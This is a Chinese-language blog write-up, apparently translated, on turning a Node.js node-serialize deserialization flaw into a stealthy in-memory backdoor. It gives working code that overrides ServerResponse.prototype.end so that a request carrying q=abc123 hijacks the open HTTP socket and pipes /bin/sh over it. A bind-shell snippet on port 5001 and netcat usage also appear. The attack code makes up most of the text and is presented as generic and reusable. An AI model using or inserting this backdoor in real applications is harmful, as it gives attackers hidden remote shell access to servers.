**我们的重点**
我发现在opsecx博客提出的利用技术有点粗鲁，但是却是个是非常好的演示。我们已经在关键过程中实现了eval，这样我们可以做许多事情，以便获得更好的入侵，而不需要涉及到python和阶段攻击。
这将存储我们的代码，使我们不必担心编码。 现在我们要做的是修改配置文件cookie，以便代码变量可以嵌入在JSON和特殊方式node-serialize函数的正确编码之后。
这很漂亮！ 现在每次我们更改代码变量时，配置文件cookie有效负载将通过保持编码链和节点序列化来使其完全完成而动态更改。
**内存后门**
我们需要处理我们的代码有效负载。 假设我们不知道应用程序是如何工作的，我们需要一个通用的方法来利用它，或者对于任何其他应用程序，没有环境或设置的预先知识。
这意味着我们不能依赖可能存在或可能不存在的全局范围变量。 我们不能依赖express应用程序导出，因此它可以访问额外的路由安装。
我们不想生成新的端口或反向shell，以保持最小的配置文件等。
这是一个很大的要求，但满足一些研究后，很容易找到一种方法，来实现。
我们的旅程从http模块引用ServerResponse函数开始。
ServerResponse的原型用作expressjs中的响应对象的__proto__。
    /**
     * Response prototype.
     */
    var res = module.exports = {
      __proto__: http.ServerResponse.prototype
    };
    This means that if we change the prototype of ServerResponse that will reflect into the __proto__ of the response. The send method from the response object calls into the ServerResponse prototype.
    if (req.method === 'HEAD') {
      // skip body for HEAD
      this.end();
    } else {
      // respond
      this.end(chunk, encoding);
    }
这意味着一旦send方法被调用，将调用end方法，这恰好来自ServerResponse的原型。
由于send方法被充分地用于任何与expressjs相关的事情，这也意味着我们现在有一个直接的方式来快速访问更有趣的结构，如当前打开的套接字。
如果我们重写原型的end方法，这意味着我们可以从这个引用获得一个对socket对象的引用。
实现这种效果的代码看起来像这样。
    require('http').ServerResponse.prototype.end = (function (end) {
      return function () {
        // TODO: this.socket gives us the current open socket
      }
    })(require('http').ServerResponse.prototype.end)
由于我们覆盖了end的原型，我们还需要以某种方式区分我们的启动请求和任何其他请求，因为这可能会导致一些意想不到的行为。
我们将检查查询参数的特殊字符串（abc123），告诉我们这是我们自己的恶意请求。 可以从这样的套接字访问httpMessage对象来检索此信息。
    require('http').ServerResponse.prototype.end = (function (end) {
      return function () {
        // TODO: this.socket._httpMessage.req.query give us reference to the query
      }
    })(require('http').ServerResponse.prototype.end)
现在我们准备好一切。 剩下的是启动shell。 在节点中这是相对直接的。
    var cp = require('child_process')
    var net = require('net')
    net.createServer((socket) => {
        var sh = cp.spawn('/bin/sh')
        sh.stdout.pipe(socket)
        sh.stderr.pipe(socket)
        socket.pipe(sh.stdin)
    }).listen(5001)
在合并两个段之后，最终代码如下所示。 注意我们如何通过重用已经建立的套接字来重定向结束函数以在节点内产生一个shell。
    require('http').ServerResponse.prototype.end = (function (end) {
      return function () {
        if (this.socket._httpMessage.req.query.q === 'abc123') {
            var cp = require('child_process')
            var net = require('net')
            var sh = cp.spawn('/bin/sh')
            sh.stdout.pipe(this.socket)
            sh.stderr.pipe(this.socket)
            this.socket.pipe(sh.stdin)
        } else {
            end.apply(this, arguments)
        }
      }
    })(require('http').ServerResponse.prototype.end)
现在打开netcat到localhost 3000并键入以下请求
    $ nc localhost 3000 GET /?q=abc123 HTTP/1.1 
    ls -la
什么？ 你得不到任何东西。你看，我们正在劫持一个现有的套接字，因此我们不是套接字的唯一保管人。
还有其他的事情可能响应那个套接字，所以我们需要确保我们照顾他们。 幸运的是，这是很容易实现与一点知识如何节点套接字工作。 最终的代码看起来像这样。
    require('http').ServerResponse.prototype.end = (function (end) {
      return function () {
        if (this.socket._httpMessage.req.query.q === 'abc123') {
            ['close', 'connect', 'data', 'drain', 'end', 'error', 'lookup', 'timeout', ''].forEach(this.socket.removeAllListeners.bind(this.socket))
            var cp = require('child_process')
            var net = require('net')
            var sh = cp.spawn('/bin/sh')
            sh.stdout.pipe(this.socket)
            sh.stderr.pipe(this.socket)
            this.socket.pipe(sh.stdin)
        } else {
            end.apply(this, arguments)
        }
      }
    })(require('http').ServerResponse.prototype.end)
现在，只要我们喜欢，我们就可以利用这个漏洞。 可以通过使用相同的服务器进程和建立的套接字打开具有我们的特殊字符串的请求来获得远程外壳。
**结论**
我们从一个简单的RCE漏洞开始，最终创建了一个通用的方法来生成一个已经建立的HTTP通道的shell，它应该在许多类型的情况下独立工作，有一些注意事项，我会留给你们。
整个事情的最棒的部分是在[Rest](https://rest.secapps.com/)的帮助下是开发简单了很多，这无疑是最后几个帖子中的功劳：[1](http://blog.websecurify.com/2017/02/hacking-wordpress-4-7-0-1.html)，[2](http://blog.websecurify.com/2017/02/hacking-json-web-tokens.html)，[3](http://blog.websecurify.com/2017/01/whats-up-with-rest.html)。
**传送门**
* * *
[**【漏洞分析】利用Node.js反序列化的漏洞执行远程代码（含演示视频）**](http://bobao.360.cn/learning/detail/3488.html)